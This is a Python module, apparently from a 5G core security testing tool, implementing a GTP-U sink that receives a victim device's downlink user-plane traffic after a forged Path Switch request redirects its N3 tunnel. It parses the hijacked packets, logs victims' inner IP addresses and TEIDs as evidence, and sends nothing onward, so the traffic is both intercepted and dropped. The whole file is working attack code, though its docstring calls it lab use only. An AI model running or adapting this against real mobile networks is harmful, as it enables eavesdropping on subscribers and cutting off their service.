"""Minimal GTP-U downlink sink — the receiving half of the Path Switch attack.

After a forged PATH SWITCH REQUEST redirects a victim UE's downlink N3 tunnel to
`attacker_ip`/`teid`, the UPF starts sending that UE's *downlink* user-plane here.
This module just binds UDP/2152 and decodes each G-PDU enough to prove capture:
the outer source (= the real UPF N3 address, which the empty ACK transfer does
*not* disclose), the TEID, and the inner IP header (victim traffic in the clear
unless N3 IPsec).

It sends nothing back, so the victim's downlink is simultaneously *intercepted*
and *black-holed* (no onward forwarding) — i.e. this is both a confidentiality
and an availability effect, observed rather than asserted. Lab use only.

GTP-U header per TS 29.281 §5.1:
  octet0 = flags: version(3b)=1, PT(1b)=1, spare, E, S, PN
  octet1 = message type (0xFF = G-PDU / T-PDU)
  octet2-3 = length (of payload + optional header, big-endian)
  octet4-7 = TEID
  [if E|S|PN set] octet8-11 = seq(2) + N-PDU(1) + next-ext-hdr-type(1)
"""
from __future__ import annotations

import socket
import struct
import time

GTPU_PORT = 2152
GPDU = 0xFF  # G-PDU (carries a user T-PDU)


def _inner_ip_summary(payload: bytes) -> str:
    """One-line summary of the tunnelled inner packet (IPv4/IPv6 best-effort)."""
    if not payload:
        return "(empty T-PDU)"
    ver = payload[0] >> 4
    if ver == 4 and len(payload) >= 20:
        proto = payload[9]
        src = socket.inet_ntoa(payload[12:16])
        dst = socket.inet_ntoa(payload[16:20])
        pname = {1: "ICMP", 6: "TCP", 17: "UDP"}.get(proto, str(proto))
        return f"IPv4 {src} -> {dst} proto={pname} len={len(payload)}"
    if ver == 6 and len(payload) >= 40:
        src = socket.inet_ntop(socket.AF_INET6, payload[8:24])
        dst = socket.inet_ntop(socket.AF_INET6, payload[24:40])
        return f"IPv6 {src} -> {dst} len={len(payload)}"
    return f"non-IP T-PDU ({len(payload)} bytes) {payload[:16].hex()}"


def parse_gtpu(pkt: bytes) -> dict | None:
    """Decode a GTP-U datagram. Returns {teid, msg_type, inner} or None if it is
    not a version-1 GTP-U packet."""
    if len(pkt) < 8:
        return None
    flags = pkt[0]
    if (flags >> 5) != 1:  # not GTP version 1
        return None
    msg_type = pkt[1]
    teid = struct.unpack("!I", pkt[4:8])[0]
    hdr = 8
    if flags & 0x07:  # any of E/S/PN => 4 extra header octets present
        hdr += 4
    payload = pkt[hdr:]
    return {"teid": teid, "msg_type": msg_type, "inner": payload}


def run_sink(bind_ip: str = "0.0.0.0", port: int = GTPU_PORT,
             duration: float | None = None, evidence=None, out=print):
    """Listen for redirected downlink G-PDUs. Runs until `duration` seconds
    elapse (None = until interrupted). Appends JSONL evidence if a path given."""
    import json

    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((bind_ip, port))
    sk.settimeout(1.0)
    out(f"[gtpu-sink] listening on {bind_ip}:{port} "
        f"(duration={'inf' if duration is None else duration}s) - "
        f"awaiting redirected downlink")

    started = time.monotonic()
    seen_teids: set[int] = set()
    count = 0
    ev = open(evidence, "a") if evidence else None
    try:
        while duration is None or (time.monotonic() - started) < duration:
            try:
                pkt, addr = sk.recvfrom(65535)
            except socket.timeout:
                continue
            g = parse_gtpu(pkt)
            if not g or g["msg_type"] != GPDU:
                continue
            count += 1
            inner = _inner_ip_summary(g["inner"])
            first = g["teid"] not in seen_teids
            seen_teids.add(g["teid"])
            tag = "  [NEW TEID]" if first else ""
            out(f"[gtpu-sink] from UPF {addr[0]}:{addr[1]}  TEID={g['teid']:#010x}  "
                f"{inner}{tag}")
            if ev:
                ev.write(json.dumps({
                    "event": "gtpu-downlink-intercepted",
                    "upf_n3_src": addr[0], "upf_n3_port": addr[1],
                    "teid": g["teid"], "inner": inner,
                    "raw_prefix_hex": pkt[:48].hex(),
                }) + "\n")
                ev.flush()
    finally:
        if ev:
            ev.close()
        sk.close()
    out(f"[gtpu-sink] stopped. {count} downlink G-PDU(s) intercepted "
        f"from {len(seen_teids)} TEID(s): {[hex(t) for t in sorted(seen_teids)]}")
    return {"gpdu_count": count, "teids": sorted(seen_teids)}
